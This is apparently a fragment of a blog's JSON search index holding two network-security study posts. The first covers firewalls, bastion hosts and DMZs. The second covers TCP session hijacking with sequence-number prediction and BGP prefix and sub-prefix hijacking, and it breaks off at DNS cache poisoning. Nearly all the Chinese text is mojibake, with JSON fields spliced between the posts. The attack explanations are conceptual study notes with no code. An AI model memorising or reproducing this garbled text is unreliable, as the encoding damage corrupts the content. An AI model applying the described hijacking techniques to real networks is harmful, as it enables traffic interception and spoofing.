¹æ®ç½‘ç»œæ¨¡å‹çš„ä¸åŒï¼Œæœ‰ä¸€äº›æ•™æä¹Ÿæœ‰è¯´æ˜¯è·‘åœ¨ Transport layer ä¼ è¾“å±‚çš„ã€‚ ä¹Ÿè¢«ç§°ä¸º circuit gateways, transparent proxy firewall å…¶ä¸»è¦çš„ç›®æ ‡æ˜¯å¯¹å†…å¤–ç½‘æƒ³è¦å»ºç«‹çš„è¿æ¥è¿›è¡Œå®¡æ ¸ï¼Œé€šè¿‡ packet filters ä¸ circuit gateways çš„ç»“åˆå¯ä»¥æ„é€ èµ·ä¸€ä¸ª dynamic packet filter   å¦‚ä½•å®ç°è¿æ¥çš„è¿‡æ»¤å‘¢ï¼Ÿ\nä¸»è¦æ˜¯é€šè¿‡ relay/proxy è¿æ¥ï¼Œgatewayä¼šåˆ†åˆ«ä¸ server side ä»¥åŠ client-side å»ºç«‹ç‹¬ç«‹çš„è¿æ¥ åœ¨packet filterï¼Œæ— è®ºæ˜¯ stateful æˆ–è€…æ˜¯ stateless ä¸­ï¼ŒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯çš„è¿æ¥éƒ½æ˜¯ç›´è¿çš„ï¼Œè€Œåœ¨ circuit-level gatewayä¸­å®ç°çš„relayå¯ä»¥å¾ˆå¥½çš„éšè—serverå’Œclientçš„ä¿¡æ¯ï¼Œå¤–ç½‘åªèƒ½è§‚å¯Ÿåˆ°gatewayçš„IPåœ°å€ï¼Œè€Œä¸çŸ¥é“å…·ä½“è¿æ¥çš„å†…ç½‘è®¾å¤‡çš„ä¿¡æ¯  ä¸Šå›¾å°±æ˜¯å½“å¤–ç½‘çš„clientæƒ³è¦è¿æ¥å†…ç½‘çš„æœåŠ¡ï¼Œå°±ä¼šå…ˆä¸gatewayå»ºç«‹è¿æ¥ï¼Œgatewayä¼šç»´æŠ¤ä¸€ä¸ªæœ‰æ•ˆè¿æ¥çš„è¡¨ï¼Œå¦‚æœè¿æ¥æ˜¯è¢«å…è®¸çš„ï¼Œé‚£ä¹ˆå°±ä¼šç»§ç»­å»ºç«‹è¿æ¥ï¼Œgatewayä¼šç”¨å…¬ç½‘IPåœ°å€ä¸å¤–ç½‘çš„clientå»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼Œå†ä¸å†…ç½‘çš„è®¾å¤‡ç”¨å†…ç½‘IPå»ºç«‹TCPè¿æ¥ï¼Œä¹‹åå°±ä¸å†è¿‡æ»¤æ•°æ®ï¼Œåªæ˜¯åšç…è›‹çš„è½¬å‘ã€‚   Application-level proxy firewall Application gateways, also referred to as application-level gateways (ALG) or proxy servers, æ˜¯å®‰è£…åœ¨æŒ‡å®šè®¾å¤‡ä¸Šçš„è½¯ä»¶åŒ…ï¼Œåƒproxyä¸€æ ·ï¼Œç”¨æ¥ä¸ºå†…ç½‘ç”¨æˆ·å¤„ç†æ¥è‡ªå¤–ç½‘çš„æœåŠ¡è¯·æ±‚ã€‚ ALGå¯ä»¥è¢«é…ç½®ä¸ºåº”ç”¨çš„ç‰¹å®šç‰¹å¾è¿›è¡Œè¿‡æ»¤ï¼Œä¾‹å¦‚MIMEï¼Œæˆ–è€…SQLæ ¼å¼æ¥å†³å®šæ•°æ®åŒ…çš„payloadæ˜¯å¦åˆæ³•ã€‚ é€šè¿‡ç›‘æµ‹åˆ†æè¿™äº›payloadï¼ŒALGå¯ä»¥æ£€æµ‹å‡ºæ¶æ„ä»£ç è¿˜æœ‰å¯ç–‘çš„æ•°æ®åŒ…ï¼Œè¿›è€Œå±è”½å¯ä»¥çš„IPåœ°å€ä»¥åŠç«¯å£å·ï¼Œè¿™äº›å¤„ç†å°†ä¼šè¦æ±‚ALGæœåŠ¡å™¨æœ‰å¤§é‡çš„è¿ç®—å¤„ç†å’Œå­˜å‚¨çš„éœ€æ±‚ã€‚ ALGé‡‡ç”¨ç™½åå•çš„å½¢å¼ï¼Œéœ€è¦ä¸ºä¸åŒçš„applicationsé…ç½®ä¸åŒçš„å®¡æ ¸æœºåˆ¶ï¼Œå¦åˆ™å°±ä¸èƒ½è¿›è¡Œä¼ è¾“ If gateway does not implement the proxy code for a specific application, then the service is not supported and cannot be forwarded across the firewall   å¦‚ä½•è¿æ¥åˆ°ALGæœåŠ¡?\n ç”¨æˆ·ä½¿ç”¨TCP/IPåº”ç”¨æ¥è¿›è¡Œè¿æ¥ï¼Œä¾‹å¦‚Telnet/FTP  ALGä¼šè¦æ±‚ç”¨æˆ·æä¾›æƒ³è¦è¿æ¥è¿œç¨‹ç”¨æˆ·çš„åå­—  ç”¨æˆ·æä¾›æœ‰æ•ˆçš„user IDä»¥åŠç›¸å…³çš„è®¤è¯ä¿¡æ¯  ALGä¼šrelay TCP segmentæ¥è¿›è¡Œç›‘æµ‹å¹¶è½¬å‘       ALGçš„ä¼˜ç‚¹\n ç›¸è¾ƒäº packet filtering firewalls æ›´ä¸ºå®‰å…¨  åªéœ€è¦ç›‘æµ‹ä¸€å°éƒ¨åˆ†ç‰¹å®šçš„åº”ç”¨å³å¯  æ›´æ–¹ä¾¿çš„è®°å½•æ—¥å¿—ä»¥åŠç›‘æµ‹åº”ç”¨å±‚çš„payload       ALGçš„ç¼ºç‚¹\n æ¯ä¸€ä¸ªæœåŠ¡éƒ½éœ€è¦è¿›è¡Œproxy  éœ€è¦å¤§é‡çš„è®¡ç®—å¤„ç†ä»¥åŠæ¶ˆè€—å¤§é‡çš„å­˜å‚¨ç©ºé—´     Bastion hosts and Gateways æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ Application gateway å‡ºäºå†…å¤–ç½‘ä¹‹å‰å……å½“è½¬å‘çš„ä½œç”¨ï¼Œä½†æ˜¯ç›¸å¯¹çš„ï¼ŒALGæš´éœ²åœ¨å¤–ç½‘è¿™ç§ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¯¹å…¶æä¾›æ›´å¤šçš„ä¿æŠ¤ï¼Œä¸€ç§å°±æ˜¯ Tursted Operating Systems (TOS), è¿˜æœ‰ä¸€ç§å°±æ˜¯æˆ‘ä»¬æœ¬ç« å°†è¦æåˆ°çš„ Bastion hosts å ¡å’æœºã€‚ Bastion hostså ¡å’æœºå°†æä¾›å¼ºå¤§çš„é˜²å¾¡æªæ–½ï¼ŒåŒ…æ‹¬è”åˆä½¿ç”¨æˆ‘ä»¬ä¹‹å‰æ‰€æåˆ°è¿‡çš„ application gateways, circuit gatways ä»¥åŠå„ç§ç±»å‹çš„firewallsï¼ŒåŒæ—¶å ¡å’æœºå®‰è£…äº†å¯ä»¥ä¿¡ä»»çš„æ“ä½œç³»ç»ŸTOSï¼Œåªæä¾›å¿…è¦çš„ç¨‹åºåŠŸèƒ½ï¼Œä¾‹å¦‚SSH, DNS, SMTP, authentication programsã€‚ Bastionä¸Šçš„Proxyå¿…é¡»æ»¡è¶³ä»¥ä¸‹æ¡ä»¶  Gateway softwareçš„å¼€å‘å¿…é¡»ä½¿ç”¨å°å‹çš„moduleï¼Œå› ä¸ºå°å‹çš„moduleæ›´åŠ å®¹æ˜“æ£€æŸ¥æ¼æ´ï¼Œå¹¶æ–¹ä¾¿é‡å¤ä½¿ç”¨  å ¡å’æœºå¿…é¡»å¯¹ç½‘ç»œå±‚çš„ç”¨æˆ·è¿›è¡Œå•ç‹¬çš„èº«ä»½è®¤è¯ï¼Œä¾‹å¦‚é€šè¿‡IP packet ä¸­çš„ source IP addressä»¥åŠdestination IP addressï¼Œè¿™å°†ä¸æ›´é«˜å±‚çš„éªŒè¯åˆ†ç¦»å¼€æ¥è¿›è¡Œèº«ä»½è®¤è¯  å ¡å’æœºéœ€è¦å°½å¯èƒ½å°‘å¾—å»è¿æ¥å†…ç½‘çš„ä¸»æœºï¼Œè¿™æ ·ä¸€æ—¦å ¡å’æœºå‡ºç°é—®é¢˜ï¼Œæ³¢åŠåˆ°çš„ä¸»æœºä¹Ÿä¼šå‡å°‘  å ¡å’æœºéœ€è¦è®°å½•æ‰€æœ‰çš„ç³»ç»Ÿæ—¥å¿—ï¼ŒåŒ…æ‹¬TCPä¼šè¯è¿æ¥çŠ¶æ€ï¼Œè¿™å°†å¸®åŠ©ç®¡ç†å‘˜å‘ç°é—®é¢˜  æ‰€æœ‰è·‘åœ¨å ¡å’æœºä¸Šçš„ä»£ç†æœåŠ¡éƒ½éœ€è¦ç‹¬ç«‹è¿è¡Œï¼Œä¸€æ—¦ä¸€ä¸ªgatewayå‘ç”Ÿé—®é¢˜ï¼Œåªéœ€è¦å•ç‹¬å…³é—­å³å¯  å ¡å’æœºåº”è¯¥é¿å…å°†æ•°æ®å†™å…¥ç¡¬ç›˜ä¿å­˜ï¼ˆåªå†™å…¥å†…å­˜ä¸­ï¼Ÿï¼‰ï¼Œé¿å…æ¶æ„è½¯ä»¶çš„å†™å…¥  å ¡å’æœºä¸Šè¿è¡Œçš„gatewayè½¯ä»¶ä¸éœ€è¦ç»™äºˆç®¡ç†å‘˜æƒé™   Bastion host case study AWSå°±æ˜¯é€šè¿‡è®¾ç½®å ¡å’æœºä»¥åŠå…¶ä¸­çš„Gatewayæ¥å¯¹å±é™©çš„SSHè¿›è¡Œrelayï¼Œé¿å…æš´éœ²çœŸæ­£çš„Linux instance Firewall location and configuration Personal firewall ä¸ªäººé˜²ç«å¢™çš„ä¸»è¦ç›®çš„æ˜¯æ§åˆ¶ç”¨æˆ·ç”µè„‘ä¸å¤–ç½‘çš„ç½‘ç»œæµé‡ ä½ç½®ï¼šé€šå¸¸æ˜¯å®‰è£…åœ¨ä¸ªäººç”µè„‘æˆ–è€…è·¯ç”±å™¨ä¸Šçš„è½¯ä»¶åŒ… ä¸»è¦ä½œç”¨ï¼š  æ‹’ç»æœªç»è®¸å¯çš„å¤–éƒ¨è®¿é—®  ç›‘æ§å‡ºç«™æµé‡æ¥åˆ†ææ¶æ„è½¯ä»¶çš„æ´»åŠ¨   Host-based firewall Host-based firewallå…¶å®ä¸personal firewallååˆ†ç›¸ä¼¼ï¼ŒåŒºåˆ«æˆ‘è§‰å¾—å°±æ˜¯personal firewallä¸€èˆ¬æ˜¯ç”¨åœ¨æ™®é€šç”¨æˆ·æ‰€ä½¿ç”¨çš„æ“ä½œç³»ç»Ÿä¸Šçš„ï¼Œè€ŒHost-based firewallåˆ™æ›´å¤šçš„æ˜¯æœåŠ¡å™¨ä¸Šçš„ä½¿ç”¨ï¼Œä½†ç‰¹ç‚¹éƒ½æ˜¯ä¸€æœºä¸€wall è€Œæˆ‘ä»¬ä¹‹å‰æåˆ°çš„ç”¨æ¥åˆ†å‰²å†…å¤–ç½‘çš„firewallæˆ‘ä»¬ç§°ä¸ºnetwork-based firewallï¼ŒåŒºåˆ«å°±åœ¨äºèµ·ä½œç”¨åŸŸä¸ä¸€æ · ä½ç½®ï¼šé€šå¸¸è¢«å®‰è£…åœ¨ä¸€ä¸ªwebæœåŠ¡å™¨ä¸Š   Advantages\n å¯ä»¥æ ¹æ®ä¸»æœºçš„æƒ…å†µè¿›è¡Œè¿‡æ»¤è§„åˆ™çš„å®šåˆ¶  å¯ä»¥æ ¹æ®ä¼ä¸šä¸åŒçš„å®‰å…¨æ”¿ç­–è¿›è¡Œå®šåˆ¶  å¯ä»¥é˜²å¾¡å†…éƒ¨ä»¥åŠå¤–éƒ¨çš„ç½‘ç»œ     DMZ networks   DMZ\nä½äºä¸¤ä¸ªé˜²ç«å¢™ä¸­é—´çš„å­ç½‘æˆ‘ä»¬ç§°ä¸ºDemilitarised Zones (DMZ éå†›äº‹åŒ–åŒºåŸŸï¼Ÿ), å…¶å¯ä»¥æ˜¯ç‰©ç†çš„ä¹Ÿå¯ä»¥æ˜¯é€»è¾‘å­ç‹  å¤–éƒ¨çš„firewallä¿æŠ¤DMZç½‘ç»œæ¥è‡ªå¤–ç½‘çš„å¨èƒ  é’ˆå¯¹å¤–ç½‘çš„è¿æ¥    å†…éƒ¨çš„firewallä¿æŠ¤DMZç½‘ç»œæ¥è‡ªå†…éƒ¨çš„å¨èƒ  ä¿æŠ¤é‚£äº›ç›´æ¥ä»DMZç½‘ç»œä¸­å‘å‡ºçš„æ”»å‡»ï¼Œä¾‹å¦‚worms, rootkit, bots     DMZä¸­è¿˜å¯ä»¥åµŒå¥—DMZå½¢æˆå¤šå±‚çš„DMZï¼Œé‚£ä¹ˆè¿æ¥åœ¨æœ€æœ«ç«¯firewallçš„å­ç½‘å°±æ˜¯æœ€å®‰å…¨çš„ï¼Œç›¸åï¼Œè¿æ¥åœ¨æœ€å¤–ä¾§çš„firewallå°±æ˜¯æœ€ä¸å®‰å…¨çš„ï¼Œå› ä¸ºä»–ä»¬åªæœ‰ä¸€ä¸ªfirewallçš„ä¿æŠ¤ï¼Œéšç€ç»“æ„çš„å¢åŠ å’Œå¤æ‚åŒ–ï¼Œå®‰å…¨ç³»æ•°ä¹Ÿåœ¨æé«˜ï¼Œæ”»å‡»è€…éœ€è¦ç»•è¿‡ä¸€å±‚å±‚çš„è¿‡æ»¤è§„åˆ™æ‰èƒ½åˆ°è¾¾æœ€æœ«ç«¯çš„è®¾å¤‡ã€‚ é€šå¸¸æ¥è¯´ï¼Œä¸€äº›ä¸éœ€è¦ç‰¹åˆ«å¼ºçš„ä¿æŠ¤çš„æœåŠ¡å™¨ç”µè„‘å’Œå…¶ä»–è®¾å¤‡ä¼šè¢«æ”¾åˆ°DMZç½‘ç»œä¸­ï¼Œä»–ä»¬èµ·ç å¯ä»¥é¿å…æš´éœ²åœ¨å¤–ç½‘å½“ä¸­ã€‚ ä¾‹å¦‚æˆ‘ä»¬å¯ä»¥æŠŠWAFå’Œè´Ÿè½½å‡è¡¡è¿™äº›åŠŸèƒ½æ€§çš„æœåŠ¡å™¨ç»™æ”¾ç½®åœ¨DMZç½‘ç»œä¸­ è¿˜æœ‰ä¸€äº›ç”¨äºä¿ƒè¿›å†…å¤–è¿æ¥çš„æœåŠ¡å™¨ä¹Ÿä¼šé˜²æ­¢åœ¨DMZä¸­ï¼Œä¾‹å¦‚ä¼ä¸šç½‘ç«™ï¼Œé‚®ä»¶ä»¥åŠDNSæœåŠ¡å™¨    Distributed firewalls åˆ†å¸ƒå¼çš„é˜²ç«å¢™æ¡†æ¶ï¼Œå°†ç»¼åˆä½¿ç”¨å¤šç§é˜²ç«å¢™ï¼Œæ¯”å¦‚å•ç‹¬çš„é˜²ç«å¢™è®¾å¤‡ä»¥åŠå®‰è£…åœ¨å„ä¸ªserverä¸Šçš„host-based firewall ä»¥åŠ å®‰è£…åœ¨å„ä¸ªç”¨æˆ·ç³»ç»Ÿä¸Šçš„ personal firewall  Security monitoring  æ—¥å¿—è®°å½•  é˜²ç«å¢™ç»Ÿè®¡æ•°æ®  å¯¹äºå•ç‹¬çš„ç”¨æˆ·çš„ç›‘æ§     Cloud firwalls Virtual private cloud (VPC) Azure Firewall Firewall summary  ","date":"2022-04-29T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week5_firewalls/","title":"NSE Week5: Firewalls"},{"content":"NSE Week4: Hijacking and poisoning TCP Session Hijacking What is Hijacking åŠ«æŒ? æŒ‡çš„æ˜¯åŠ«å–å…¶ä»–äººçš„ä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡Œçš„æ—¶å€™ã€‚ Hijacking åŠ«æŒä¸spoofingçš„ä¸åŒç‚¹åœ¨äºï¼š  Hijacking æ˜¯åŠ«æŒä¸€ä¸ªå·²ç»å­˜åœ¨çš„TCPè¿æ¥  è€ŒSpoffingåˆ™æ˜¯é€šè¿‡ä¿®æ”¹IP headeræ¥å‘èµ·æ–°çš„è¿æ¥è¿›è¡Œæ¬ºéª—     Off-path v.s. On-path adversaries\né¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åˆ¤æ–­å‘èµ·åŠ«æŒçš„ä¸»æœºæ˜¯å¦åœ¨è¿æ¥çš„ä¸¤å°ä¸»æœºçš„è·¯ç”±ä¸Šï¼š  å¦‚æœåœ¨è·¯ç”±ä¸Šï¼Œé‚£ä¹ˆå°±æ˜¯On-path, è¿™ç§åŠ«æŒæ›´ä¸ºå¼ºå¤§ï¼Œå¯ä»¥ç›´æ¥æ³¨å…¥é”™è¯¯çš„ä¿¡æ¯ï¼Œä½†æ˜¯å´å¾ˆéš¾æ‰©å¤§è§„æ¨¡  å¦‚æœä¸åœ¨è·¯ç”±ä¸Šï¼Œé‚£ä¹ˆå°±æ˜¯Off-path,è¿™ç§åŠ«æŒå°±æ— æ³•ç›´æ¥æ³¨å…¥é”™è¯¯çš„ä¿¡æ¯äº†     TCP connection å¦‚ä½•å”¯ä¸€è¯†åˆ«ä¸€ä¸ªTCPè¿æ¥å‘¢ï¼Ÿ (source IP address + port number) + (destination IP address + port number) Port numberå°±æŒ‡ç¤ºäº†åŒæ–¹æ‰€è¿è¡Œçš„åº”ç”¨å±‚çš„åº”ç”¨   TCP three-way handshake\n é€šè¿‡ä¸æ–­å¢åŠ Sequence numberä»¥åŠAcknowledgement numberæ¥å®ç°æ¡æ‰‹ï¼Œä»¥åŠåç»­çš„é€šä¿¡     How does an attacker hijack a TCP session?\næ”»å‡»è€…éœ€è¦æ„é€ ä¸€ä¸ªTCP segmentæ¥æ»¡è¶³sequence number \u0026amp; acknowledgement numberçš„å›å¤ é‚£ä¹ˆéœ€è¦çš„ä¿¡æ¯æœ‰  Source IP address + port number (easy to get)  Destination IP address + port number (easy to get)  Sequence number (å¦‚æœæ”»å‡»è€…åœ¨è·¯ç”±ä¸Šçš„è¯å°±ä¸ä¼šå¾ˆéš¾ï¼Œå› ä¸ºå¯ä»¥é€šè¿‡è·å–åˆ°çš„é€šä¿¡æ•°æ®åŒ…æ¥æ¨æµ‹)    Sequence numberå¯ä»¥æ˜¯æ•æ‰åˆ°çš„æ•°æ®åŒ…çš„sequence number + 1 äº¦æˆ–æ˜¯+ nï¼Œåªè¦nä¸è¦å¤ªå¤§ï¼Œæ¥æ”¶è€…éƒ½ä¼šå°†è¿™äº›æ•°æ®åŒ…ä¿å­˜åœ¨bufferä¸­ï¼Œç­‰å¾…ä¸­é—´â€œæœªæ¥æ”¶åˆ°â€çš„æ•°æ®åŒ…   TCP on-path connection hijacking TCP on-path connection hijacking, attackerå¯ä»¥æ›´æ–¹ä¾¿çš„æ¥æ”¶åˆ°é€šä¿¡çš„sequence numberå’Œacknowledgement number åªéœ€è¦åˆç†å¢åŠ æ•°å­—ï¼Œå°±å¯ä»¥å®ç°åŠ«æŒï¼Œå¹¶å‘å‡ºæ¶æ„ä¿®æ”¹çš„æ•°æ®ï¼š  å—…æ¢æ•°æ®åŒ…  é¢„æµ‹sequence number (client -\u0026gt; server; server -\u0026gt; client)  æ³¨å…¥æ¶æ„æ•°æ®     TCP off-path connection hijacking ç”±äºæ”»å‡»è€…çš„ä¸»æœºå¹¶ä¸åœ¨è¿æ¥çš„è·¯ç”±ä¸Šï¼Œå› æ­¤attackeræ²¡æœ‰åŠæ³•è·å–ä»»ä½•å½“å‰è¿æ¥çš„ä¿¡æ¯ï¼Œå› æ­¤å…¶éœ€è¦ä¸»åŠ¨å‘èµ·ä¸€ä¸ªè¿æ¥ï¼Œç„¶ååœ¨åŠ«æŒè¿™ä¸ªè¿æ¥ï¼ŒåŒæ—¶è¿”å›åˆæ³•çš„sequence number,ä½†è¿™ä¸€æ¬¡å› ä¸ºæ— æ³•è¿›è¡Œå—…æ¢ï¼Œåªèƒ½è¿›è¡ŒçŒœæµ‹    How to guess the initial sequence number\nè¿™é‡Œåˆ©ç”¨çš„å°±æ˜¯ä¸€äº›æ“ä½œç³»ç»Ÿæ²¡æœ‰ä½¿ç”¨è§„èŒƒçš„æ ‡å‡†æ¥å®ç°TCPè¿æ¥ RFC 793 (TCP specification) :\nWhen new connections are created, an initial sequence number (ISN) generator is employed which selects a new 32 bit ISN. The generator is bound to a 32 bit clock whose low order bit is incremented roughly every 4 microseconds. Thus, the ISN cycles approximately every 4.55 hours. (4 microseconds x 2^32) Since we assume that segments will stay in the network no more than the Maximum Segment Lifetime (MSL, defined as 2 minutes in RFC 793) and that the MSL is less than 4.55 hours we can reasonably assume that ISNâ€™s will be unique. [i.e., sequence numbers should not repeat for at least 4.55 hours] The purpose is to ensure undelivered packets from previous connection that arrive late do not overlap with current connection æ€»ç»“ï¼šåœ¨RFC 793çš„æ ‡å‡†ä¸‹ï¼Œsequence numberçš„é€’å¢å‘¨æœŸå°±æ˜¯4.55 hoursï¼Œè¿™è¶…å‡ºäº†æœ€é•¿çš„è¿æ¥æ—¶é—´(2mins),å› æ­¤æ— è®ºæ€ä¹ˆé€’å¢ï¼Œéƒ½åŸºæœ¬ä¸ä¼šä»å¤´å¼€å§‹ï¼Œå¯ä»¥å°†æ‰€æœ‰çš„sequence numberçœ‹ä½œæ˜¯uniqueå”¯ä¸€çš„ Unfortunately, BSD Unix TCP/IP stack did not adhere to these recommendations : - The sequence number for BSD TCP/IP stacks increases by 128,000 every second and by 64,000 for every new TCP connection. - Such a sequence is relatively easy to predict and can be much more readily exploited than one which follows the RFC standard å¯æ˜¯åœ¨BSD Unixä¸­ï¼Œå´æ²¡æœ‰æŒ‰ç…§æ ‡å‡†å®ç°ï¼Œè€Œæ˜¯å˜æˆäº†sequence numberæ¯ç§’å¢åŠ 128,000ï¼Œæ¯ä¸€ä¸ªæ–°çš„è¿æ¥å¢åŠ  64,000, è¿™æ”¾å®½äº†é¢„æµ‹çš„æ—¶é—´ä»¥åŠç¼©å°äº†èŒƒå›´ï¼Œä½¿sequence numberå¾ˆå®¹æ˜“è¢«é¢„æµ‹     TCP initial sequence number attack\n Attackeré¦–å…ˆé€šè¿‡floodingä½¿clientæ— æ³•æ­£å¸¸å·¥ä½œï¼Œç„¶åå‘èµ·ä¸€ä¸ªæ–°çš„TCPè¿æ¥ç»™serverï¼Œç„¶åé€šè¿‡é¢„æµ‹sequence numberæ¥ä¼ªè£…æˆclientæ¥è¿›è¡Œé€šä¿¡   BGP Route Hijacking BGP and AS Border Gateway Procol ä¹Ÿè¢«è®¤ä¸ºæ˜¯æœ€é‡è¦çš„Internetåè®®ä¹‹ä¸€ï¼Œå› ä¸ºå…¶èƒ½å¤ŸæŠŠå¤šä¸ªISPsç»„ç»‡åœ¨ä¸€èµ·è¿ä½œ BGPæ˜¯ä¸€ä¸ªinter-Autonomous System (ASs) è·¯ç”±åè®®ï¼ˆç”¨äºè‡ªæ²»åŒºå†…éƒ¨çš„è®¾å¤‡ä¹‹å‰é€šä¿¡ï¼‰   Autonomous system (AS, è‡ªæ²»ç³»ç»Ÿ)  ASæ˜¯è·¯ç”±ç­–ç•¥ä¸­çš„åŸºæœ¬å•ä½ï¼Œç”±åŒä¸€ä¸ªç»„ç»‡çš„ç®¡ç†å‘˜æ‰€ç®¡ç†çš„æ‰€æœ‰ç½‘ç»œéƒ½å±äºä¸€ä¸ªASæ¥ä½œä¸ºè·¯ç”±åè®®çš„åŸºç¡€  æ¯ä¸€ä¸ªASå†…éƒ¨éƒ½æœ‰å¾ˆå¤šè®¾å¤‡ç›¸è¿ï¼Œä¹Ÿä¼šæœ‰å¾ˆå¤šçš„ç½‘ç»œ  sometimes referred to as a routing domain  Autonomous System Number (ASN), æ¯ä¸€ä¸ªASéƒ½æœ‰ä¸€ä¸ªï¼Œå…¨çƒå”¯ä¸€     BGP routing table and CIDR prefix åœ¨BGPä¸­ï¼Œè·¯ç”±å¹¶ä¸æ˜¯ç›´æ¥æŒ‡å®šå¦‚ä½•åˆ°è¾¾ä¸€ä¸ªIPåœ°å€ï¼Œè€Œæ˜¯å¦‚ä½•è¾¾åˆ°ä¸€ä¸ªç½‘æ®µï¼Œ Classless Inter-Domain Routing (CIDR) prefixes   CIDR prefix\nCIDR prefixå°±æ˜¯subnet maskä¸­å«æœ‰1çš„æ•°é‡ 172.16.122.204/16 å°±ä½äº172.16.0.0/16ç½‘æ®µå½“ä¸­ï¼Œå‰é¢16bitsä¸ºnetworkæ®µï¼Œç”¨æ¥æŒ‡ç¤ºç½‘æ®µ;åé¢ä¸ºhostæ®µï¼Œç”¨æ¥æŒ‡ç¤ºå…·ä½“çš„ä¸»æœº CIDR prefix = 16 BGP Routing table ç”±ä¸¤éƒ¨åˆ†ç»„æˆä¸€ä¸ªentry (x, l)ï¼š   xå°±æ˜¯ç½‘æ®µ   lå°±æ˜¯è·¯ç”±å™¨çš„æ¥å£interfaceï¼ŒæŒ‡å‘ä¸‹ä¸€è·³çš„åœ°å€        BGP çš„åŠŸèƒ½\n ä»å‘¨è¾¹çš„ASsä¸­è·å–ä¸åŒçš„ç½‘æ®µçš„reachability  BGPå…è®¸æ‰€æœ‰çš„å­ç½‘éƒ½èƒ½å®£å‘Šè‡ªå·±çš„å­˜åœ¨  BGPæ¥ç€ä¼šç¡®ä¿æ‰€æœ‰çš„è·¯ç”±å™¨éƒ½èƒ½çŸ¥é“è¿™ä¸ªå­ç½‘çš„å­˜åœ¨    å†³å®šæ¯ä¸€ä¸ªè·¯ç”±å™¨åˆ°è¾¾ä¸åŒå­ç½‘çš„æœ€ä¼˜è·¯å¾„  Policy  Prefix reachability information    ASsä½¿ç”¨æœ€é•¿æ©ç åŒ¹é…æœºåˆ¶ï¼ˆlongest prefix matchingï¼‰æ¥é€‰æ‹©è·¯å¾„  ä¾‹å¦‚å½“éœ€è¦å†³å®š192.168.20.19çš„è·¯ç”±æ—¶ï¼Œæœ‰ä¸¤ä¸ªå­ç½‘éœ€è¦é€‰æ‹©  192.168.20.16/28; 192.168.0.0/16  é€‰æ‹©192.168.20.16/28ï¼Œå› ä¸ºå…¶å­ç½‘æ©ç é•¿ï¼Œæ›´å…·ä½“       BGP route advertisement and propagation æ¥ç€æˆ‘ä»¬å…·ä½“å±•å¼€æ¥è®²ä¸Šé¢æåˆ°è¿‡çš„BGPçš„åŠŸèƒ½ é¦–å…ˆæ˜¯å®£å‘Šå­ç½‘çš„åŠŸèƒ½ ä¾‹å¦‚ä¸‹å›¾ï¼ŒAS22394ä¸­æœ‰66.174.161.0/24è¿™ä¸ªå­ç½‘ï¼Œäºæ˜¯å…¶å¼€å§‹å‘å¤–å®£å‘Šè‡ªå·±æœ‰è¿™ä¸ªå­ç½‘ ç„¶åæŒ‰ç…§ç›¸é‚»çš„é¡ºåºï¼ŒAS6167é¦–å…ˆæ”¶åˆ°äº†è¿™ä¸ªå®£å‘Šï¼Œç„¶åè®°å½•ä¸‹æ¥6167,22394è¿™ä¸ªé¡ºåº ç„¶åä¾æ¬¡ç»§ç»­å®£å‘Šï¼Œå¹¶ä¸æ–­è®°å½•æ¬¡åºï¼Œæ–¹ä¾¿å°†æ¥è·¯ç”±  eBGP and iBGP connections é‚£ä¹ˆASä¸­ä¹Ÿæœ‰å¾ˆå¤šçš„è·¯ç”±å™¨å±äºä¸åŒçš„ç½‘ç»œï¼Œä»–ä»¬ä¹‹å‰ä¹Ÿä¼šäº¤æ¢å­ç½‘çš„ä¿¡æ¯æ–¹ä¾¿ASå†…éƒ¨çš„è·¯ç”±ï¼Œå› æ­¤æœ‰å†…å¤–ä¸¤ç§BGPåè®®æ¥è¿›è¡Œè·¯ç”±   eBGP, external BGP (TCP),ç”¨äºä¸åŒçš„ASä¹‹å‰çš„è·¯ç”±å™¨ä¹‹é—´çš„é€šä¿¡   iEBGP, internal BGP (TCP), ç”¨äºåŒä¸€ä¸ªASä¸­çš„è·¯ç”±å™¨ä¹‹é—´çš„é€šä¿¡    BGP route/prefix/sub-prefix hijacking é‚£ä¹ˆæœ‰ä¿¡æ¯äº¤æ¢ï¼Œå°±æœ‰hijackingï¼Œæœ¬è´¨ä¸ŠBGPçš„hijackingçš„ç›®çš„å°±æ˜¯é€šè¿‡å®£å‘Šæ”»å‡»è€…çš„ASèƒ½å¤Ÿåˆ°è¾¾ç›®æ ‡å­ç½‘ï¼Œæ¥è¯±ä½¿å…¶ä»–çš„ASå°†åŸæœ¬å°†è¦å‘é€åˆ°ç›®æ ‡å­ç½‘çš„æ•°æ®å‘é€åˆ°æ”»å‡»è€…çš„ASä¸­æ¥ã€‚å…¶ä¸­ä¹Ÿæœ‰ä¸¤ç§ä¸åŒçš„æ–¹å¼   BGP route/prefix hijacking\nä¸€ç§æ˜¯é€šè¿‡ç›´æ¥å®£å‘Šç›®æ ‡å­ç½‘åœ¨æ”»å‡»è€…çš„ASä¸­çš„é”™è¯¯ä¿¡æ¯æ¥è¯¯å¯¼å…¶ä»–ASå°†æ•°æ®å‘é€è¿‡æ¥     BGP sub-prefix hijacking\nå°±æ˜¯åˆ©ç”¨æˆ‘ä»¬ä¹‹å‰æåˆ°çš„è¿‡çš„longest matchingåŸåˆ™ï¼Œé€šè¿‡åŠ é•¿å­ç½‘æ©ç çš„é•¿åº¦ï¼Œè¯±å¯¼ASé€‰æ‹©æ›´ä¸ºç¡®åˆ‡çš„å­ç½‘ ä¾‹å¦‚ç›®æ ‡å­ç½‘ä¸º10.100.0.0/16ï¼Œæ”»å‡»è€…å°±å®£å‘Šï¼Œ10.100.0.0/24 æ¥è¯¯å¯¼å…¶ä»–çš„AS   BGP routing blackhole and two incidents How to create a routing blackhole? å¦‚æœASså¼€å§‹å®£å‘Šæ— æ³•æä¾›çš„å­ç½‘ï¼Œé‚£ä¹ˆæ•´ä¸€ä¸ªInternetå°±ä¼šé™·å…¥æ··ä¹±ï¼Œå› ä¸ºæ•°æ®åŒ…æ°¸è¿œæ— æ³•åˆ°è¾¾åº”è¯¥å‘é€çš„ä½ç½®ï¼Œä¹Ÿæ”¶ä¸åˆ°ä»»ä½•çš„å›å¤ DNS Cache Poisoning DNS and DNS structure Domain Name System, DNS  